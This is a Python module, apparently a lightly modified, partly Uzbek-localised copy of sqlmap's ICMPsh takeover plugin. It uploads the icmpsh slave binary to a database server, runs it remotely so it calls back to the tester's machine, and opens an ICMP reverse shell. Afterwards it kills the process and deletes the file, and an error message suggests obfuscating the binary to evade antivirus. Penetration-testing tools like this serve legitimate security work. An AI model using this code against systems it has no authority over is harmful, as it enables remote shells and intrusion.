#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.uzbek import ut
import os
import re
import socket
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import SqlmapDataException

class ICMPsh(object):
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        address = None
        message = ut('what is the back-end DBMS address? ', 'serverdagi DBMS manzili qanday? ')

        if self.remoteIP:
            message += ut("[Enter for '%s' (detected)] ", "[Aniqlangan '%s' uchun Enter] ") % self.remoteIP

        while not address:
            address = readInput(message, default=self.remoteIP)

            if conf.batch and not address:
                raise SqlmapDataException('masofaviy xost manzili kiritilmagan')

        return address

    def _selectLhost(self):
        address = None
        message = ut('what is the local address? ', 'mahalliy manzil qanday? ')

        if self.localIP:
            message += ut("[Enter for '%s' (detected)] ", "[Aniqlangan '%s' uchun Enter] ") % self.localIP

        valid = None
        while not valid:
            valid = True
            address = readInput(message, default=self.localIP or "")

            try:
                socket.inet_aton(address)
            except socket.error:
                valid = False
            finally:
                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None

            if conf.batch and not address:
                raise SqlmapDataException('mahalliy xost manzili kiritilmagan')
            elif address and not valid:
                warnMsg = "mahalliy xost manzili noto'g'ri"
                logger.warning(warnMsg)

        return address

    def _prepareIngredients(self, encode=True):
        self.localIP = getattr(self, "localIP", None)
        self.remoteIP = getattr(self, "remoteIP", None)
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMaster(self):
        infoMsg = 'icmpsh bosh qismi mahalliy ishga tushirilmoqda'
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = 'icmpsh yordamchi qismi masofadan ishga tushirilmoqda'
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("icmpsh yordamchi qismi '%s' ga yuklanmoqda" % self._icmpslaveRemote)

        if web:
            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
        else:
            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = 'icmpsh yuklashda muammo; '
            errMsg += "binar fayl yozilmagan bo'lishi mumkin: "
            errMsg += 'baza joylashgan fayl tizimiga, yoki antivirus uni '
            errMsg += "zararli deb belgilab o'chirgan. Bunday holatda "
            errMsg += 'icmpsh ni qayta kompilyatsiya qilish tavsiya etiladi, '
            errMsg += "manba kodini ozgina o'zgartirib yoki uni "
            errMsg += 'obfuskatsiya dasturi bilan qadoqlab'
            logger.error(errMsg)

            return False
        else:
            logger.info('icmpsh muvaffaqiyatli yuklandi')
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = 'icmpsh bosh qismi yopildi'
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
